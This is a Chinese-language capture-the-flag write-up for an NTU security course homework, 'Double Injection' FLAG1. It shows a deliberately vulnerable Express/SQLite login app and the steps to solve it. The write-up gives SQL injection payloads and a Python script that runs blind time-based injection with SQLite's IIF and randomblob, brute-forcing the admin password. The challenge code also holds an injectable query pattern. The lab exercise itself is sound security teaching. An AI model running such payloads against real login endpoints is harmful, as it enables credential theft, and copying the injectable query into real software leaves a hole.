---
title: Simple Web 0x41(2023 HW - Double Injection - FLAG1)
tags: [eductf, CTF, Web]

category: "Security/Course/NTU CS/Web"
---

# Simple Web 0x41(2023 HW - Double Injection - FLAG1)
<!-- more -->

## Background
Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::

## Source code
:::spoiler init-db.js
```javascript
const fs = require('fs');
const sqlite3 = require('sqlite3').verbose();

const FLAG1 = fs.readFileSync('/flag1.txt', 'utf8').trim();
const db = new sqlite3.Database('/etc/db.sqlite3');
db.exec(`
DROP TABLE IF EXISTS users;
CREATE TABLE db (
    users JSON NOT NULL
);
INSERT INTO db(users) VALUES ('{
    "admin": {
        "username": "admin",
        "password": "${FLAG1}"
    },
    "guest": {
        "username": "guest",
        "password": "guest"
    }
}');
`);
```
:::
:::spoiler Dockerfile
```dockerfile
FROM node:alpine

RUN mkdir -p /usr/src/app
WORKDIR /usr/src/app
COPY ./app .

RUN yarn install

RUN echo 'FLAG{flag-1}' > /flag1.txt
RUN echo 'FLAG{flag-2}' > "/flag2-$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 16).txt"

RUN node ./init-db.js && chmod 444 /etc/db.sqlite3

RUN adduser -D -h /home/ctf ctf
RUN chown -R ctf:ctf /usr/src/app

USER ctf

CMD [ "node", "app.js" ]
```
:::
:::spoiler app.js
```javascript
const express = require('express');
const ejs = require('ejs');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const FLAG1 = fs.readFileSync('/flag1.txt', 'utf8').trim();

const db = new sqlite3.Database('/etc/db.sqlite3');

const app = express();
app.use(express.urlencoded({ extended: false }));

app.get('/', (req, res) => {
    res.send(`
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" value="Login">
    </form>`
    );
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const jsonPath = JSON.stringify(`$.${username}.password`);
    const query = `SELECT json_extract(users, ${jsonPath}) AS password FROM db`;
    // console.log(query);
    const template = `
    <html><head><title>Success</title></head><body>
    <h1>Success!</h1>
    <p>Logged in as ${username}</p>
    </body></html>
    `
    db.get(query, (err, row) => {
        if (res.headersSent) return;
        if (err) return res.status(500).send('Internal Server Error' + err);
        // console.log(row);
        if (row.password === password) {
            if (password !== FLAG1) {
                const html = ejs.render(`<h1>Success!</h1>`, { username });
                return res.send(html);
            } else {
                const html = ejs.render(template, { username });
                return res.send(html);
            } 
        } else {
            return res.status(401).send('Unauthorized');
        }
    });

    res.setTimeout(Math.random() * 50 + 10, () => res.status(401).send('Unauthorized'));
});


app.listen(3000, () => console.log('Listening on port 3000'));
```
:::

## Recon
這一題超爆難，應該可以預見被splitline凌虐，先看Dockerfile寫了甚麼，安裝的前置作業結束以後，分別把FLAG1和FLAG2的內容丟到`/flag1.txt`,`/flag2-{random string}.txt`中，並且執行db的初始化，也就是把FLAG1當成admin的密碼，接著比較重要的一步是把存取db內容的file(`/etc/db.sqlite3`)的權限設定read-only，這個操作後續會說明重要的地方，最後就是執行app.js

* 目標:
    我們的目標是想辦法把FLAG1拿到手，但看了一圈app.js也沒有任何想法，雖然我知道username的地方有SQLinjection的洞，但重要的是如何把密碼送到前端給我們
* 一開始的想法:
    送出post request後，會進到login route，並且db會對送來的username / password進行query，此時會發現有兩個if statement，當時我在想，只要滿足第一個if statement，他就會return並且render出原本的username，所以如果我可以創一個新的table或是insert原本的users table，並且把username設定成FLAG1，然後password設定已知，這樣的話就一定會進到第二個if statement，如此就算我不知道FLAG1是多少，他也會把username吐回來到前端
    ```javascript
    if (row.password === password) {
        if (password !== FLAG1) {
            const html = ejs.render(`<h1>Success!</h1>`, { username });
            return res.send(html);
        } else {
            const html = ejs.render(template, { username });
            return res.send(html);
        } 
    } else {
        return res.status(401).send('Unauthorized');
    }
    ```
    但這個做法有兩個原因導致無法實踐
    1. 前面講過，splitline把`/etc/db.sqlite3`設定成read-only，所以我們無法對他做任何修改
    2. 就算這個file可以修改，因為ejs.render的關係，如果給定的1st參數沒有format可以填入(就像第二個if出現的template)，他並不會把username一起render進去，雖然我也不確定為甚麼要這樣寫
* 比較可行的方式
    1. 逛了好幾圈app.js都沒有任何可以把username吐回前端的地方，代表這個思路應該不是可行的方式，此時可以想想看time based或是boolean based 這種blind injection，可能是個不錯的方式，雖然我也有嘗試union based，不過效果不大
    2. 因為是完全沒有任何filter的sql injection，所以我就直接在local的sqlite db browser下語法順便debug，當payload如下時:
        ```sql!
        admin.username") as a,
          json_extract(users, '$.admin.username') as b,
          json_extract(users, '$.admin.password') as c
        FROM db -- #
        ```
        * 在server端會變成
            ```sql!
            "$.admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db -- # .password"
            ```
        * 完整的query會變成
            ```sql!
            SELECT json_extract(users, "$.admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db -- # .password") AS password FROM db
            ```
        * 則query到的data如下
            ```sql!
            { a: null, b: 'admin', c: 'FLAG{flag-1}' }
            ```
        第一個參數a為null是因為app.js中，我們的payload經過==JSON.stringify==，會在雙引號前加一個反斜線，這會導致query時，db不知道==$.admin.username\==是甚麼東西，只有單引號沒有這個問題，但如果第一個query data不加上雙引號就會導致閉合不全而導致結果異常(如下)
        ![圖片](https://hackmd.io/_uploads/Hy29LmYvp.png)
        所以我乾脆第一個參數就算了，重新利用後兩個參數要到username和password
    3. 有了這個可以幹嘛呢?我們可以下條件，當條件符合的時候做A，否則做B，而A和B是有一些差異，可能是時間長度或是網站是否crash為基準，這樣的話我們就可以知道下的條件是否正確，POC如下:
        * 看長度
            ```sql
            SELECT 
              json_extract(users, '$.admin.username') as a,
              json_extract(users, '$.admin.username') as b,
              json_extract(users, '$.admin.password') as c
            FROM db
            WHERE
                b = 'admin'
                AND IIF(length(c) = 10, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 
            ```
            在local測試時，FLAG1=`FLAG{test}`，也就是只有10個字，如果條件設定不符合時，就會query出東西，因為條件不符回傳1，如下圖
            ![圖片](https://hackmd.io/_uploads/SJxwu7Fwa.png)
            
            ---
            反之，就會query不出東西，也就是crash
            ![圖片](https://hackmd.io/_uploads/Hywt_QYvp.png)
        * 如果想要知道某一個字元可以substr這個function
            ```sql
            SELECT 
              json_extract(users, '$.admin.username') as a,
              json_extract(users, '$.admin.username') as b,
              json_extract(users, '$.admin.password') as c
            FROM db
            WHERE
                b = 'admin'
                AND IIF(substr(c, 1, 5) = 'FLAG{', (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 
            ```
    4. 此時就可以開寫script去server端爆破FLAG1

## Exploit - Time Based SQLi
```python!
from requests import *
from string import *


strings = ascii_letters + digits + punctuation
url = "http://10.113.184.121:10081/login"

flag = ""
for i in range(27):
    if i == 26:
        flag += "}"
        break
    else:
        for string in strings:
            payload = f"admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db  WHERE    b = 'admin'    AND IIF(substr(c, 1, {i + 1}) = '{flag + string}', (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # "

            # payload = "admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db  WHERE    b = 'admin'    AND IIF(length(c) = 27, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # "
            
            # print(payload)

            try:
                r = post(url=url, data={"username" : payload, "password" : "guest"})
            except:
                flag += string
                print(flag)
                break
print(flag)
```

Flag: `FLAG{sqlite_js0n_inject!on}`

## Reference
[ChatGPT - SQL Syntax Questions](https://chat.openai.com/share/fcca9a7d-234d-4a38-9de8-0aa19f1af101)
[ChatGPT - Timed Based Questions](https://chat.openai.com/share/27a4119a-b798-403f-b6a6-ab3963309a09)
[Overview of SQLite IIF() function](https://www.sqlitetutorial.net/sqlite-functions/sqlite-iif/)